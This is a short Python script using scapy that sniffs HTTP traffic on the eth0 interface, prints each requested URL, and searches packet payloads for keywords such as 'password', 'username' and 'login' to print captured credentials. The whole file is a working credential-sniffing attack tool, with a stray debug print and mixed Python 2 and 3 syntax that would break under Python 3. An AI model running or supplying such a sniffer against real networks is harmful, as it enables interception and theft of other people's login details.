#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            Raw = packet[scapy.Raw]
            keywords = ["password","username","usr","pass","user","login","pwd"]
            for keyword in keywords:
                if keyword in str(Raw):
                    return Raw

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info=get_login_info(packet)
        print "hhhhh"
        if login_info:
            print ("\n[+] Possible username/password >>> " + str(login_info) +"\n\n")

sniff("eth0")
